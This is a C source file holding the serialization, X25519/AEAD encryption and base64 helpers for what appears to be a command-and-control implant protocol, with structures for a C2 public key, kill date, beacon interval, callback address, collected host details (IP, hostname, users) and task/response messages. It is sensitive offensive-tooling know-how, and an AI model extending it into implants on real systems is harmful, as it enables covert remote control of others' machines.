// For strdup in C11 mode
#define _POSIX_C_SOURCE 200809L

#include "sindarin.h"
#include <stdio.h>
#include <string.h>
#include <monocypher.h>

// ============================================================================
// Serialization Buffer Functions
// ============================================================================

SerBuffer* ser_buffer_create(size_t initial_capacity) {
    SerBuffer* buf = (SerBuffer*)malloc(sizeof(SerBuffer));
    buf->data = (uint8_t*)malloc(initial_capacity);
    buf->size = 0;
    buf->capacity = initial_capacity;
    return buf;
}

void ser_buffer_free(SerBuffer* buf) {
    if (buf) {
        free(buf->data);
        free(buf);
    }
}

void ser_buffer_append(SerBuffer* buf, const uint8_t* data, size_t len) {
    while (buf->size + len > buf->capacity) {
        buf->capacity *= 2;
        buf->data = (uint8_t*)realloc(buf->data, buf->capacity);
    }
    memcpy(buf->data + buf->size, data, len);
    buf->size += len;
}

void ser_buffer_append_byte(SerBuffer* buf, uint8_t byte) {
    ser_buffer_append(buf, &byte, 1);
}

// ============================================================================
// Flatty Serialization Helpers
// ============================================================================

static void serialize_string(SerBuffer* buf, const char* str) {
    size_t len = str ? strlen(str) : 0;
    // Write length as 64-bit little-endian
    uint64_t len64 = len;
    ser_buffer_append(buf, (uint8_t*)&len64, 8);
    if (len > 0) {
        ser_buffer_append(buf, (uint8_t*)str, len);
    }
}

static void serialize_int32(SerBuffer* buf, int32_t value) {
    ser_buffer_append(buf, (uint8_t*)&value, 4);
}

static void serialize_int64(SerBuffer* buf, int64_t value) {
    ser_buffer_append(buf, (uint8_t*)&value, 8);
}

static void serialize_bool(SerBuffer* buf, bool value) {
    uint8_t byte = value ? 1 : 0;
    ser_buffer_append_byte(buf, byte);
}

static void serialize_bytes(SerBuffer* buf, const uint8_t* bytes, size_t len) {
    uint64_t len64 = len;
    ser_buffer_append(buf, (uint8_t*)&len64, 8);
    ser_buffer_append(buf, bytes, len);
}

// ============================================================================
// Flatty Deserialization Helpers
// ============================================================================

static char* deserialize_string(const uint8_t* data, size_t len, size_t* offset) {
    if (*offset + 8 > len) return NULL;

    uint64_t str_len;
    memcpy(&str_len, data + *offset, 8);
    *offset += 8;

    if (*offset + str_len > len) return NULL;

    char* str = (char*)malloc(str_len + 1);
    memcpy(str, data + *offset, str_len);
    str[str_len] = '\0';
    *offset += str_len;

    return str;
}

static int32_t deserialize_int32(const uint8_t* data, size_t len, size_t* offset) {
    if (*offset + 4 > len) return 0;

    int32_t value;
    memcpy(&value, data + *offset, 4);
    *offset += 4;

    return value;
}

static int64_t deserialize_int64(const uint8_t* data, size_t len, size_t* offset) {
    if (*offset + 8 > len) return 0;

    int64_t value;
    memcpy(&value, data + *offset, 8);
    *offset += 8;

    return value;
}

static bool deserialize_bool(const uint8_t* data, size_t len, size_t* offset) {
    if (*offset + 1 > len) return false;

    bool value = data[*offset] != 0;
    *offset += 1;

    return value;
}

// ============================================================================
// EncObj Serialization
// ============================================================================

uint8_t* serialize_enc_obj(EncObj* obj, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(1024);

    // Serialize publicKey (32 bytes)
    ser_buffer_append(buf, obj->publicKey.data, 32);

    // Serialize nonce (24 bytes)
    ser_buffer_append(buf, obj->nonce.data, 24);

    // Serialize mac (16 bytes)
    ser_buffer_append(buf, obj->mac.data, 16);

    // Serialize cipherLen (int64)
    serialize_int64(buf, obj->cipherLen);

    // Serialize cipherText (seq[byte])
    serialize_bytes(buf, obj->cipherText, obj->cipherLen);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf); // Free buffer struct but not data
    return result;
}

EncObj* deserialize_enc_obj(const uint8_t* data, size_t len, size_t* offset) {
    EncObj* obj = (EncObj*)malloc(sizeof(EncObj));

    // Deserialize publicKey
    if (*offset + 32 > len) goto error;
    memcpy(obj->publicKey.data, data + *offset, 32);
    *offset += 32;

    // Deserialize nonce
    if (*offset + 24 > len) goto error;
    memcpy(obj->nonce.data, data + *offset, 24);
    *offset += 24;

    // Deserialize mac
    if (*offset + 16 > len) goto error;
    memcpy(obj->mac.data, data + *offset, 16);
    *offset += 16;

    // Deserialize cipherLen
    obj->cipherLen = deserialize_int64(data, len, offset);

    // Deserialize cipherText length
    uint64_t seq_len = deserialize_int64(data, len, offset);

    if (obj->cipherLen != (int64_t)seq_len) {
        fprintf(stderr, "EncObj deserialization error: cipherLen != seq_len\n");
        goto error;
    }

    // Deserialize cipherText
    if (*offset + seq_len > len) goto error;
    obj->cipherText = (uint8_t*)malloc(seq_len);
    memcpy(obj->cipherText, data + *offset, seq_len);
    *offset += seq_len;

    return obj;

error:
    free(obj);
    return NULL;
}

// ============================================================================
// EncConfig Serialization
// ============================================================================

uint8_t* serialize_enc_config(EncConfig* config, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(1024);

    // EncConfig is a ref object in Nim - add ref indicator byte
    ser_buffer_append_byte(buf, 0); // 0 = not nil

    // Serialize privKey
    ser_buffer_append(buf, config->privKey.data, 32);

    // Serialize pubKey
    ser_buffer_append(buf, config->pubKey.data, 32);

    // Serialize encObj
    size_t enc_obj_len;
    uint8_t* enc_obj_data = serialize_enc_obj(&config->encObj, &enc_obj_len);
    ser_buffer_append(buf, enc_obj_data, enc_obj_len);
    free(enc_obj_data);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf);
    return result;
}

EncConfig* deserialize_enc_config(const uint8_t* data, size_t len) {
    size_t offset = 0;

    // Check ref indicator byte
    if (data[offset] == 1) return NULL; // nil
    offset += 1;

    EncConfig* config = (EncConfig*)malloc(sizeof(EncConfig));

    // Deserialize privKey
    if (offset + 32 > len) goto error;
    memcpy(config->privKey.data, data + offset, 32);
    offset += 32;

    // Deserialize pubKey
    if (offset + 32 > len) goto error;
    memcpy(config->pubKey.data, data + offset, 32);
    offset += 32;

    // Deserialize encObj
    EncObj* enc_obj = deserialize_enc_obj(data, len, &offset);
    if (!enc_obj) goto error;
    config->encObj = *enc_obj;
    free(enc_obj);

    return config;

error:
    free(config);
    return NULL;
}

// ============================================================================
// StaticConfig Serialization
// ============================================================================

uint8_t* serialize_static_config(StaticConfig* config, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(1024);

    // StaticConfig is a ref object in Nim - add ref indicator byte
    ser_buffer_append_byte(buf, 0); // 0 = not nil

    // Serialize fields
    serialize_string(buf, config->buildID);
    serialize_string(buf, config->deploymentID);
    ser_buffer_append(buf, config->c2PubKey.data, 32);
    serialize_int32(buf, config->killEpoch);
    serialize_int32(buf, config->interval);
    serialize_string(buf, config->callback);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf);
    return result;
}

StaticConfig* deserialize_static_config(const uint8_t* data, size_t len, size_t* offset) {
    // Check ref indicator byte
    if (data[*offset] == 1) {
        *offset += 1;
        return NULL; // nil
    }
    *offset += 1;

    StaticConfig* config = (StaticConfig*)malloc(sizeof(StaticConfig));

    config->buildID = deserialize_string(data, len, offset);
    config->deploymentID = deserialize_string(data, len, offset);

    if (*offset + 32 > len) goto error;
    memcpy(config->c2PubKey.data, data + *offset, 32);
    *offset += 32;

    config->killEpoch = deserialize_int32(data, len, offset);
    config->interval = deserialize_int32(data, len, offset);
    config->callback = deserialize_string(data, len, offset);

    return config;

error:
    free_static_config(config);
    return NULL;
}

// ============================================================================
// Status Serialization
// ============================================================================

uint8_t* serialize_status(Status* status, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(1024);

    serialize_string(buf, status->ip);
    serialize_string(buf, status->externalIP);
    serialize_string(buf, status->hostname);
    serialize_string(buf, status->os);
    serialize_string(buf, status->arch);
    serialize_string(buf, status->users);
    serialize_int64(buf, status->bootTime);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf);
    return result;
}

Status* deserialize_status(const uint8_t* data, size_t len, size_t* offset) {
    Status* status = (Status*)malloc(sizeof(Status));

    status->ip = deserialize_string(data, len, offset);
    status->externalIP = deserialize_string(data, len, offset);
    status->hostname = deserialize_string(data, len, offset);
    status->os = deserialize_string(data, len, offset);
    status->arch = deserialize_string(data, len, offset);
    status->users = deserialize_string(data, len, offset);
    status->bootTime = deserialize_int64(data, len, offset);

    return status;
}

// ============================================================================
// Callback Serialization
// ============================================================================

uint8_t* serialize_callback(Callback* callback, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(2048);

    // Callback is a ref object - add ref indicator byte
    ser_buffer_append_byte(buf, 0); // 0 = not nil

    // Serialize config
    size_t config_len;
    uint8_t* config_data = serialize_static_config(callback->config, &config_len);
    ser_buffer_append(buf, config_data, config_len);
    free(config_data);

    // Serialize status
    size_t status_len;
    uint8_t* status_data = serialize_status(callback->status, &status_len);
    ser_buffer_append(buf, status_data, status_len);
    free(status_data);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf);
    return result;
}

Callback* deserialize_callback(const uint8_t* data, size_t len) {
    size_t offset = 0;

    // Check ref indicator byte
    if (data[offset] == 1) return NULL; // nil
    offset += 1;

    Callback* callback = (Callback*)malloc(sizeof(Callback));

    callback->config = deserialize_static_config(data, len, &offset);
    callback->status = deserialize_status(data, len, &offset);

    return callback;
}

// ============================================================================
// Task Serialization
// ============================================================================

uint8_t* serialize_task(Task* task, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(1024);

    serialize_string(buf, task->taskId);
    serialize_int64(buf, task->taskNum);
    serialize_bool(buf, task->retrieved);
    serialize_bool(buf, task->complete);
    serialize_string(buf, task->arg);
    serialize_string(buf, task->resp);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf);
    return result;
}

Task* deserialize_task(const uint8_t* data, size_t len) {
    size_t offset = 0;
    Task* task = (Task*)malloc(sizeof(Task));

    task->taskId = deserialize_string(data, len, &offset);
    task->taskNum = deserialize_int64(data, len, &offset);
    task->retrieved = deserialize_bool(data, len, &offset);
    task->complete = deserialize_bool(data, len, &offset);
    task->arg = deserialize_string(data, len, &offset);
    task->resp = deserialize_string(data, len, &offset);

    return task;
}

// ============================================================================
// Resp Serialization
// ============================================================================

uint8_t* serialize_resp(Resp* resp, size_t* out_len) {
    SerBuffer* buf = ser_buffer_create(512);

    serialize_string(buf, resp->taskId);
    serialize_string(buf, resp->resp);

    *out_len = buf->size;
    uint8_t* result = buf->data;
    free(buf);
    return result;
}

Resp* deserialize_resp(const uint8_t* data, size_t len) {
    size_t offset = 0;
    Resp* resp = (Resp*)malloc(sizeof(Resp));

    resp->taskId = deserialize_string(data, len, &offset);
    resp->resp = deserialize_string(data, len, &offset);

    return resp;
}

// ============================================================================
// Memory Management Functions
// ============================================================================

void free_enc_obj(EncObj* obj) {
    if (obj) {
        free(obj->cipherText);
        free(obj);
    }
}

void free_enc_config(EncConfig* config) {
    if (config) {
        free(config->encObj.cipherText);
        free(config);
    }
}

void free_static_config(StaticConfig* config) {
    if (config) {
        free(config->buildID);
        free(config->deploymentID);
        free(config->callback);
        free(config);
    }
}

void free_status(Status* status) {
    if (status) {
        free(status->ip);
        free(status->externalIP);
        free(status->hostname);
        free(status->os);
        free(status->arch);
        free(status->users);
        free(status);
    }
}

void free_callback(Callback* callback) {
    if (callback) {
        free_static_config(callback->config);
        free_status(callback->status);
        free(callback);
    }
}

void free_task(Task* task) {
    if (task) {
        free(task->taskId);
        free(task->arg);
        free(task->resp);
        free(task);
    }
}

void free_resp(Resp* resp) {
    if (resp) {
        free(resp->taskId);
        free(resp->resp);
        free(resp);
    }
}

// ============================================================================
// Utility Functions
// ============================================================================

void key_from_bytes(Key* key, const uint8_t* bytes) {
    memcpy(key->data, bytes, 32);
}

void nonce_from_bytes(Nonce* nonce, const uint8_t* bytes) {
    memcpy(nonce->data, bytes, 24);
}

void mac_from_bytes(Mac* mac, const uint8_t* bytes) {
    memcpy(mac->data, bytes, 16);
}

// ============================================================================
// Encryption Functions (using Monocypher)
// ============================================================================

void generate_key_pair(Key* priv_key, Key* pub_key) {
    // Generate random private key (in production, use a proper CSPRNG)
    FILE* urandom = fopen("/dev/urandom", "rb");
    if (!urandom) {
        fprintf(stderr, "Failed to open /dev/urandom\n");
        return;
    }
    fread(priv_key->data, 1, 32, urandom);
    fclose(urandom);

    // Compute public key from private key
    crypto_x25519_public_key(pub_key->data, priv_key->data);
}

EncObj* encrypt_message(const Key* sender_priv, const Key* recipient_pub,
                        const uint8_t* message, size_t msg_len) {
    EncObj* enc_obj = (EncObj*)malloc(sizeof(EncObj));

    // Generate random nonce
    FILE* urandom = fopen("/dev/urandom", "rb");
    if (!urandom) {
        free(enc_obj);
        return NULL;
    }
    fread(enc_obj->nonce.data, 1, 24, urandom);
    fclose(urandom);

    // Perform key exchange to get shared key
    uint8_t shared_key[32];
    crypto_x25519(shared_key, sender_priv->data, recipient_pub->data);

    // Allocate ciphertext buffer
    enc_obj->cipherText = (uint8_t*)malloc(msg_len);
    enc_obj->cipherLen = msg_len;

    // Encrypt using monocypher's lock function
    crypto_aead_lock(enc_obj->cipherText, enc_obj->mac.data,
                     shared_key, enc_obj->nonce.data,
                     NULL, 0,  // No additional data
                     message, msg_len);

    // Get the sender's public key
    crypto_x25519_public_key(enc_obj->publicKey.data, sender_priv->data);

    // Wipe shared key from memory
    crypto_wipe(shared_key, 32);

    return enc_obj;
}

uint8_t* decrypt_message(const Key* priv_key, const EncObj* enc_obj, size_t* out_len) {
    // Perform key exchange to get shared key
    uint8_t shared_key[32];
    crypto_x25519(shared_key, priv_key->data, enc_obj->publicKey.data);

    // Debug: Print shared key
    #ifdef DEBUG_CRYPTO
    printf("DEBUG shared_key: ");
    for (int i = 0; i < 32; i++) {
        printf("%02x", shared_key[i]);
    }
    printf("\n");
    #endif

    // Allocate plaintext buffer
    uint8_t* plaintext = (uint8_t*)malloc(enc_obj->cipherLen);

    // Decrypt using monocypher's unlock function
    // Order: plaintext, mac, key, nonce, ad, ad_size, ciphertext, text_size
    int result = crypto_aead_unlock(plaintext, enc_obj->mac.data,
                                    shared_key, enc_obj->nonce.data,
                                    NULL, 0,
                                    enc_obj->cipherText, enc_obj->cipherLen);

    // Wipe shared key from memory
    crypto_wipe(shared_key, 32);

    if (result != 0) {
        // Decryption failed (MAC mismatch)
        #ifdef DEBUG_CRYPTO
        printf("DEBUG: crypto_aead_unlock returned %d (MAC mismatch)\n", result);
        #endif
        free(plaintext);
        return NULL;
    }

    *out_len = enc_obj->cipherLen;
    return plaintext;
}

// ============================================================================
// Base64 Encoding/Decoding Functions
// ============================================================================

static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

static const char base64_url_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789-_";

static int base64_decode_char(char c, bool url_safe) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (!url_safe && c == '+') return 62;
    if (!url_safe && c == '/') return 63;
    if (url_safe && c == '-') return 62;
    if (url_safe && c == '_') return 63;
    return -1;
}

uint8_t* base64_decode(const char* input, size_t input_len, size_t* output_len) {
    if (input_len == 0) {
        *output_len = 0;
        return NULL;
    }

    // Detect if URL-safe encoding is used
    bool url_safe = false;
    for (size_t i = 0; i < input_len; i++) {
        if (input[i] == '-' || input[i] == '_') {
            url_safe = true;
            break;
        }
    }

    // Calculate output length
    size_t padding = 0;
    if (input_len >= 2 && input[input_len - 1] == '=') padding++;
    if (input_len >= 3 && input[input_len - 2] == '=') padding++;

    size_t decoded_len = (input_len * 3) / 4 - padding;
    uint8_t* output = (uint8_t*)malloc(decoded_len + 1);

    size_t out_idx = 0;
    uint32_t buffer = 0;
    int bits = 0;

    for (size_t i = 0; i < input_len; i++) {
        if (input[i] == '=' || input[i] == '\n' || input[i] == '\r') {
            continue;
        }

        int value = base64_decode_char(input[i], url_safe);
        if (value < 0) {
            continue; // Skip invalid characters
        }

        buffer = (buffer << 6) | value;
        bits += 6;

        if (bits >= 8) {
            bits -= 8;
            output[out_idx++] = (buffer >> bits) & 0xFF;
        }
    }

    *output_len = out_idx;
    return output;
}

char* base64_encode(const uint8_t* input, size_t input_len) {
    size_t output_len = 4 * ((input_len + 2) / 3);
    char* output = (char*)malloc(output_len + 1);

    size_t out_idx = 0;
    size_t i = 0;

    while (i < input_len) {
        uint32_t octet_a = i < input_len ? input[i++] : 0;
        uint32_t octet_b = i < input_len ? input[i++] : 0;
        uint32_t octet_c = i < input_len ? input[i++] : 0;

        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;

        output[out_idx++] = base64_chars[(triple >> 18) & 0x3F];
        output[out_idx++] = base64_chars[(triple >> 12) & 0x3F];
        output[out_idx++] = base64_chars[(triple >> 6) & 0x3F];
        output[out_idx++] = base64_chars[triple & 0x3F];
    }

    // Add padding
    size_t padding = (3 - (input_len % 3)) % 3;
    for (size_t j = 0; j < padding; j++) {
        output[output_len - 1 - j] = '=';
    }

    output[output_len] = '\0';
    return output;
}
